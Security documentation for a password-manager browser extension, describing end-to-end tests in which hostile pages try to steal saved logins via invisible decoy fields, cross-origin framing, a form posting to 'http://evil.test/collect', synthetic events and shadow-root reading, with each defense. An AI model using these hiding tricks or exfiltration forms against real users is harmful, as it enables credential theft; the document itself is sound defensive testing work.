# Hostile pages

What a web page can try against the extension to get a saved login out of it, what happens when it does, and what stops it. Each attack has an end-to-end test in `e2e/hostile/` that loads the built extension into Chromium, signs in to the mock Quark, unlocks the vault and runs the page. [security.md](security.md) explains the defenses themselves.

The pages are served by Playwright routes, not the test site. The attacker's page can then sit on the site's own origin (`http://localhost:<port>`, where the seeded "Local Test" login matches), on another origin (`http://127.0.0.1:<port>`), or post to one (`http://evil.test`, which a route answers and records). Each page script keeps everything it manages to read in `window.loot`, and the test searches that for the login's name, username and password. The tests read the login from the Quark at run time, so no credential appears in a test.

To run them: `npm run test:e2e:mock -- hostile/`.

## Results

An attack **succeeds** if the password reaches page script without the user knowingly filling a visible field on the login's own site, or reaches another origin. None of the attacks below succeeds. Three did when these tests were written; #129 and #130 fixed them. The second security review found more ways around the #129 checks; #142 fixed those. If an attack is found to succeed, its test is marked `test.fail` and points to the issue that tracks the fix. When the fix lands, the test starts to pass, Playwright reports it as unexpected, and the mark comes off.

| Attack | Result | Test |
| --- | --- | --- |
| Hidden decoy password fields, filled on load | Blocked | `decoy.spec.ts` › isn't filled on load |
| Hidden decoy fields, inline picker on the real field | Blocked | `decoy.spec.ts` › doesn't catch a fill from the inline picker |
| Hidden decoy fields, popup Fill or shortcut | Blocked since [#129](https://github.com/autobutler-org/quark-browser-extensions/issues/129) | `decoy.spec.ts` › doesn't catch a fill from the popup or the shortcut |
| The same, hidden by `visibility:collapse`, `filter`, a transparent mask or a `clip-path` | Blocked since [#142](https://github.com/autobutler-org/quark-browser-extensions/issues/142) | `decoy.spec.ts` › a decoy password field, visibility:collapse (and the six styles after it) |
| Cross-origin parent framing the login form | Blocked | `cross-origin.spec.ts` › a cross-origin parent can't get a login filled |
| Form whose action posts to another origin | Blocked by default | `cross-origin.spec.ts` › is filled but not submitted |
| The same, with **Submit after filling** on | Blocked since [#130](https://github.com/autobutler-org/quark-browser-extensions/issues/130) | `cross-origin.spec.ts` › a form posting to another origin isn't submitted |
| Synthetic clicks and keys on the button and picker | Blocked | `picker.spec.ts` › synthetic clicks and keys |
| Reading the picker through its shadow root host | Blocked | `picker.spec.ts` › can't read the open picker |
| Listening for input and change events during a fill | Blocked | `events.spec.ts` |
| Moving the field after the picker opens | Blocked since [#129](https://github.com/autobutler-org/quark-browser-extensions/issues/129) | `picker.spec.ts` › a password field moved … isn't filled |

Legitimate fills still work beside each attack: the picker on the real field of the decoy page, the same login frame under a same-site parent, a form posting to its own origin with **Submit after filling** on, a trusted Enter in a picker the page has been bombarding with synthetic events, and the listener page's own two fields.

## The attacks

### Decoy password fields

**The page:** on the login's own site, a username and password pair styled to be invisible, ahead of the real sign-in form, with listeners that keep whatever lands in them. One page per style: moved off-screen (`position:absolute; left:-10000px`), `opacity:0`, 1px by 1px, and since #142 `visibility:collapse`, `filter:opacity(0)`, `mask-image:linear-gradient(transparent,transparent)`, and the clip-paths `polygon(0 0,0 0,0 0)`, `inset(100px)`, `inset(0 100% 0 0)` and `circle(1px)`. Chromium paints none of the #142 styles, yet `checkVisibility()` passes and the border box stays full. This is how third-party tracking scripts have collected passwords from password managers that fill on page load.

**Result:**

- Nothing is filled on load. The extension fills only when the user acts: the inline picker, the popup, the keyboard shortcut or the context menu.
- The inline picker, opened on the real password field, fills that field and its username. The decoys stay empty.
- The popup's Fill, the keyboard shortcut and the context menu fill the real form, and the decoys stay empty. Until #129 they filled the decoys: they have no target field, so `fillLogin` takes the page's first password field, and the visibility checks then caught `display:none`, `visibility:hidden`, `[hidden]`, `tabindex=-1` and `aria-hidden` but none of these three styles. Until #142 the same went for the seven styles added then: the checks read `visibility: hidden` but not `collapse`, the `opacity` property but not `filter`, no masks, and only a leading percentage `inset()` or a zero-radius circle in `clip-path`.

**Defense:** no fill without a user action, and only into fields the user can see: opaque (filters included), at least 4px by 4px, not clipped or masked away, and on the page (`isLoginField` in `src/content/forms.ts`; [security.md](security.md#which-fields-get-a-login) has the rules). `test/forms-hidden.test.ts` and the `login-decoy-*` fixtures cover each style without a browser.

### A cross-origin parent framing the login form

**The page:** on `127.0.0.1`, an iframe showing a sign-in form from `localhost`, where the login matches. The parent polls `iframe.contentDocument`, `frames[0].document` and `contentWindow.document` for the password, and keeps every `message` event. The user picks the login from the frame's inline button, and tries the popup's Fill.

**Result:** the frame isn't filled, the popup's Fill is refused, and the parent reads nothing. Under a same-site parent the same frame fills.

**Defense:** the worker gives credentials to a frame only if both the frame's URL and the top frame's URL match the login, using the URLs the browser reports, not the page's (`fillFromPage`, `frameMayFill`). The same-origin policy keeps the parent out of the frame's document, and the extension never posts messages to the page.

### A form whose action posts to another origin

**The page:** a sign-in form on the login's own site with `action="http://evil.test/collect" method="post"` and no script: what markup injection leaves on a site whose CSP blocks scripts.

**Result:**

- By default the form is filled and nothing is sent. The page doesn't navigate and `evil.test` gets no request until the user presses Sign in.
- With Submit after filling on, the form is filled but not submitted, and `evil.test` gets nothing. Until #130 the fill submitted it at once, whatever its action. A form posting to its own origin submits as it should.

**Defense:** auto-submit is off by default, and when on it submits only to a form action (or button `formaction`) on the page's own site, over https unless the page itself is http (`sameSiteAction` in `src/shared/hostMatch.ts`; see [security.md](security.md#submit-after-filling)). Anywhere else, the user has to press Sign in.

### Synthetic clicks and keys on the Quark button or picker

**The page:** on the login's own site, every 100 ms, untrusted `pointerdown`, `mousedown`, `pointerup`, `mouseup` and `click` events and `.click()`, and `keydown`, `keypress` and `keyup` for ArrowDown, Enter and Space. They go to each inline button's host element, to whatever `elementFromPoint` finds at the button's spot, and to `document.activeElement`. This runs while the picker is closed, and again after the test opens it the way the keyboard shortcut does.

**Result:** nothing opens or fills. The picker stays open on its first login, and the user's own Enter, a trusted key press, then fills it.

**Defense:** the button and picker live in a closed shadow root, so every target the page can reach is the host element, and events dispatched on a host don't reach the buttons inside. Untrusted key events don't activate buttons. Content scripts run in an isolated world, so the page can't call their functions or reach `chrome.runtime`.

### Reading the picker through its shadow root host

**The page:** on the login's own site, a script in `<head>`, before the content script loads, replaces `Element.prototype.attachShadow` to force shadow roots open and keep them. Once the picker is open, the page reads each host's `shadowRoot`, `innerHTML`, `outerHTML`, `textContent`, `innerText` and `getHTML({ serializableShadowRoots: true })`, `chrome.dom.openOrClosedShadowRoot`, `elementsFromPoint` over the panel, the document's `innerText`, `outerHTML` and `getHTML`, and a selection of the whole body.

**Result:** the patched `attachShadow` never runs, and nothing the page reads contains the login's name, username or password. The test confirms through DevTools (`DOM.getDocument` with `pierce`) that the open picker does show the login's name, so there was something to find.

**Defense:** the closed shadow root, and the isolated world: the content script calls its own `attachShadow`, not the page's. The picker never holds a password. It shows names and hosts and asks the worker for the credentials only when the user picks.

### Listening for input and change events during a fill

**The page:** listeners on `window`, in the capture phase, for `beforeinput`, `input`, `change`, key, focus, `paste`, `select`, `invalid` and `message` events, noting each target's value. The page has a sign-in form and one other text field.

**Result:**

- On the login's own site, the page hears nothing with a value before the user picks the login. Afterwards it hears the username in the username field and the password in the password field, and nothing in the other field. The fill's `input` and `change` events are untrusted, and no key event carries a character of the password. The site the login belongs to gets the login it asked for, and nothing else.
- On another origin, the popup's Fill is refused and the page hears nothing.

**Defense:** the fill sets values directly and fires plain `input` and `change` events on the two fields it fills. It doesn't type keys, so key listeners and keyloggers see nothing.

### Moving the field after the picker opens

**The page:** on the login's own site, a listener for focus moving into an inline button's host. When the picker opens and takes focus, the page moves the password field off-screen, or gives it `opacity:0`. The user then picks the login.

**Result:** nothing is filled, and the page gets nothing. Until #129 the picker filled the field it opened on without checking it again.

**Defense:** the picker checks its field again when the user picks, before it asks the worker for the login, and `fillLogin` checks it once more when the login arrives. A field the page has hidden in between is refused with "Couldn't find the login fields on this page."
